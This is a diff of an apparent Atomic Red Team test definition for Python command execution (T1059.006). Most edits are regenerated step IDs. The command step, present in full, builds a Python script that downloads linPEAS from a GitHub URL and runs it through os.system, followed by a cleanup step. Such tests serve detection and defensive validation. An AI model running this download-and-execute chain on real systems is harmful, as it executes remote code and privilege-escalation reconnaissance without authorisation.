@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "id": "7427321a-a7f0-4dbe-8b81-e5ef8bf56619",
       "type": "execute-command",
       "data": {
         "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python #{python_script_name}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "b91b4291-0fff-47a1-8c98-3e6abbfc4485",
+      "id": "4c5c3b78-2116-466a-bf1d-7798b18eda05",
       "type": "execute-command",
       "data": {
         "command": "rm #{python_script_name} #{payload_file_name}  \n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "id": "a952bfcd-dd19-4f2a-aaf2-357bb46beed7",
       "name": "Check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "61a516d9-8ee3-4841-9116-4bdc05276f4c",
+      "id": "0edba0bb-f6fe-4113-9687-e6498ae1fac9",
       "name": "Resolve dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "df2f5143-7a3f-4ca1-9a4f-770695b72752",
+      "id": "566910d4-c242-4c59-bd59-0c7ec1b395e3",
       "name": "Re-check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "s": "7427321a-a7f0-4dbe-8b81-e5ef8bf56619",
       "p": "on-success",
-      "o": "b91b4291-0fff-47a1-8c98-3e6abbfc4485"
+      "o": "4c5c3b78-2116-466a-bf1d-7798b18eda05"
     },
     {
-      "s": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "s": "7427321a-a7f0-4dbe-8b81-e5ef8bf56619",
       "p": "on-failure",
-      "o": "b91b4291-0fff-47a1-8c98-3e6abbfc4485"
+      "o": "4c5c3b78-2116-466a-bf1d-7798b18eda05"
     },
     {
-      "s": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "s": "a952bfcd-dd19-4f2a-aaf2-357bb46beed7",
       "p": "on-success",
-      "o": "978ad7f8-1816-4552-a888-08dfc263be0b"
+      "o": "7427321a-a7f0-4dbe-8b81-e5ef8bf56619"
     },
     {
-      "s": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "s": "a952bfcd-dd19-4f2a-aaf2-357bb46beed7",
       "p": "on-failure",
-      "o": "61a516d9-8ee3-4841-9116-4bdc05276f4c"
+      "o": "0edba0bb-f6fe-4113-9687-e6498ae1fac9"
     },
     {
-      "s": "61a516d9-8ee3-4841-9116-4bdc05276f4c",
+      "s": "0edba0bb-f6fe-4113-9687-e6498ae1fac9",
       "p": "on-success",
-      "o": "df2f5143-7a3f-4ca1-9a4f-770695b72752"
+      "o": "566910d4-c242-4c59-bd59-0c7ec1b395e3"
     },
     {
-      "s": "df2f5143-7a3f-4ca1-9a4f-770695b72752",
+      "s": "566910d4-c242-4c59-bd59-0c7ec1b395e3",
       "p": "on-failure",
-      "o": "978ad7f8-1816-4552-a888-08dfc263be0b"
+      "o": "7427321a-a7f0-4dbe-8b81-e5ef8bf56619"
     }
   ],
   "tags": [
@@ -95,6 +95,12 @@
     "atomic-red-team"
   ],
   "input_arguments": [
+    {
+      "name": "script_url",
+      "type": "string",
+      "description": "Shell script public URL",
+      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
+    },
     {
       "name": "payload_file_name",
       "type": "string",
@@ -118,12 +124,6 @@
       "type": "path",
       "description": "Python script name",
       "value": "T1059.006.py"
-    },
-    {
-      "name": "script_url",
-      "type": "string",
-      "description": "Shell script public URL",
-      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
     }
   ]
 }
